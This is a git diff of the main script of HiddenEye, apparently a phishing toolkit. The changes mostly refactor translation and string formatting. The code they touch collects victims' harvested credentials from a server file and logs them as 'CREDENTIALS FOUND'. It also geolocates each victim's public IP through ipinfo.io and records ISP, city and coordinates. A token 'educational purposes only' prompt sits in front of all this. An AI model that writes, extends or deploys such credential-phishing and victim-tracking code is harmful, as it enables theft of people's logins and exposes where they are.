@@ -9,12 +9,15 @@ from urllib.request import urlopen
 from subprocess import check_output
 from sys import stdout, argv
 from Defs.Configurations import readConfig, ifSettingsNotExists
-from gettext import gettext as _
+from Defs.Languages import *
+
+checkAndSetLanguage() #WIP!!! MUST BE UPDATED
 
 RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
 
 ifSettingsNotExists()
 config = readConfig()
+
 logFile = None
 didBackground = config.get("Settings","DidBackground")
 for arg in argv:
@@ -147,7 +150,8 @@ def runMainMenu(): #menu where user select what they wanna use
 
     for i in range(101):
         sleep(0.05)
-        stdout.write(_("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait... %d%%").format(RED, DEFAULT) % i)
+        stdout.write(_("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(RED, DEFAULT, i))
+        system("clear")
         stdout.flush()
 
     if input(_("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({2}y{1}/{0}n{1})\n{2}HiddenEye >>> {1}").format(CYAN, DEFAULT, RED)).upper() != 'Y': #Question where user must accept education purposes
@@ -280,7 +284,7 @@ def getCredentials():
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 writeLog('======================================================================'.format(RED, DEFAULT))
-                writeLog(_(' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}').format(GREEN, DEFAULT) % lines)
+                writeLog(_(' {0}[ CREDENTIALS FOUND ]{1}:\n {0}{2}{1}').format(GREEN, DEFAULT, lines))
                 system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
                 writeLog('======================================================================'.format(RED, DEFAULT))
 
@@ -290,18 +294,18 @@ def getCredentials():
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                ip = re.match(_('Victim Public IP: (.*?)\n'), lines).group(1)
-                resp = urlopen('https://ipinfo.io/%s/json' % ip)
+                ip = re.match('User Public IP: (.*?)\n', lines).group(1)
+                resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
                     log('======================================================================'.format(RED, DEFAULT))
-                    log(_(' \n{0}[ VICTIM IP BONUS ]{1}:\n {0}%s{1}').format(GREEN, DEFAULT) % lines)
+                    log(_(' \n{0}[ VICTIM IP BONUS ]{1}:\n {0}{2}{1}').format(GREEN, DEFAULT, lines))
                 else:
                     matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                     latitude = matchObj.group(1)
                     longitude = matchObj.group(2)
                     writeLog('======================================================================'.format(RED, DEFAULT))
-                    writeLog(_(' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}').format(GREEN, DEFAULT) % lines)
+                    writeLog(_(' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}{2}{1}').format(GREEN, DEFAULT, lines))
                     writeLog(_(' \n{0}Longitude: {2} \nLatitude: {3}{1}').format(GREEN, DEFAULT, longitude, latitude))
                     writeLog(_(' \n{0}ISP: {2} \nCountry: {3}{1}').format(GREEN, DEFAULT, ipinfo['org'], ipinfo['country']))
                     writeLog(_(' \n{0}Region: {2} \nCity: {3}{1}').format(GREEN, DEFAULT, ipinfo['region'], ipinfo['city']))
